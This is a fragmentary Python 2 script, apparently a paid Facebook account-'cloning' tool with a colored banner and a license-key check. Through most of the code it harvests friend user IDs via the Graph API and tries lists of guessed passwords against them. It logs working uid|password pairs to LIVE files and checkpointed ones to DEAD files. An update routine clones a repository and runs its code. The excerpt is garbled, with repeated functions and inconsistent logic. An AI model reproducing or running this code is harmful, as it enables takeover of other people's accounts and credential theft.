...
'\x1b[1;93m'   [                                  ]
'\x1b[1;91m'   [                                  ]
'\x1b[1;95m'   [           SHAH_DINO-BALOCH          ]
'\x1b[1;97m'   [                                  ]
'\x1b[1;92m'   [                                  ]
'\x1b[1;91m'   ====================================


'\x1b[1;97m'   Author      :      SHAH DINO    ]    
'\x1b[1;92m'   Github      :      XXXXXXXXXXXXX    ]
'\x1b[1;93m'   FB ID       :      SHAH DINO     ]
'\x1b[1;94m'   TOOL TYPE   :         PAID          ]
'\x1b[1;96m'   WAP NUMBER  :    +923175889358      ]  
"""
dec="2"
server="2"
...
def main_apv():
    ...
    print logo
    try:
        key1=open("/sdcard/.Shah Dino.txt",'r').read()
    except IOError:
        os.system("clear")
        print logo
        ...
        kok=open("/sdcard/.Shah Dino.txt",'w')
        kok.write(myid+imt)
        kok.close()
        print ("")
    ...
    r1=requests.get("https://raw.githubusercontent.com/DINO786/txt/blob/main/txt").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
...
def main_system():
    ...
    print "\x1b[1;91m[3]   File Cloning       \x1b[1;92m (No Login)"
    print "\x1b[1;92m[4]   File Making Menu\x1b[1;92m    (Login)"
    print "\x1b[1;91m[5]   Check Subscription "
    print "\x1b[1;94m[6]   Update Tools"
    print "\x1b[1;95m[7]   For Any Help Massage WhatsApp"
    print 43*'~'
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("\x1b[1;92m        Member In Shah Dino Paid Commands ")
        print ("\x1b[1;91m        ENJOY  KRO BHI LOGO ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("git clone https://github.com/DinoKing/PAID")
        os.system("rm -rf PAID")
        os.system("cp -f PAID/PAID \\.")
        os.system("rm -rf PAID")
        os.system(" cd PAID")
        os.system(" python2 CR6.py")
        time.sleep(5)
...
def numcloning():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[LIVE] "+coc+user + " | " + pass1
                ok=open('LIVE.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[1;91m[DEAD] "+coc+user + " | " + pass1
                    cp=open('DEAD.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
    ...
    print 40*'-'
    print '[!] LIVE : ' +str(len(cps))
    print '[!] DEAD : ' +str(len(oks))
    print 40*'-'
    print ''
...
def mineExt():
    ...
    print g+"[=] Extracting From Shah Dino : "+my_line[:15]
...
def xokpauto():
    ...
    os.system('cat joj.txt | grep '+13+' >> kk.txt')
    os.system('rm -rf kk.txt')
    os.system('rm -rf jok.txt')
    os.system('clear')
    print logo
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[live] "+uid + " | " + pass1
                ok=open('live.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;91m[DeaD] "+uid + " | " + pass1
                    cp=open('DeaD.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[Live] "+uid + " | " + pass2
                        ok=open('Live.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[DeaD] "+uid + " | " + pass2
                            cp=open('DeaD.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[Live] "+uid + " | " + pass3
                                ok=open('Live.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[DeaD] "+uid + " | " + pass3
                                    cp=open('Dead.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[Live] "+uid + " | " + pass4
                                        ok=open('Live.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[Dead] "+uid + " | " + pass4
                                            cp=open('Dead.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[Live] "+uid + " | " + pass5
                                                ok=open('Live.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[Dead] "+uid + " | " + pass5
                                                    cp=open('Live.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
    ...
    print 39*'-'
    print '[!] LIVE : '+str(len(oks))
    print '[!] DEAD : '+str(len(cps))
    print 39*'-'
    print ''
    raw_input(' Press enter to back ')
    fb_menu()
...
def mineExt():
    ...
    my_line = file.readline()
    count.append(my_line)
    print g+"[*] Extracting From DINO : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[DAED] "+uid + " | " + pass5
                                                    cp=open('DEAD.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[LIVE] "+uid + " | " + pass6
                                                        ok=open('LIVE.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;91m[DEAD] "+uid + " | " + pass6
                                                            cp=open('DEAD.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
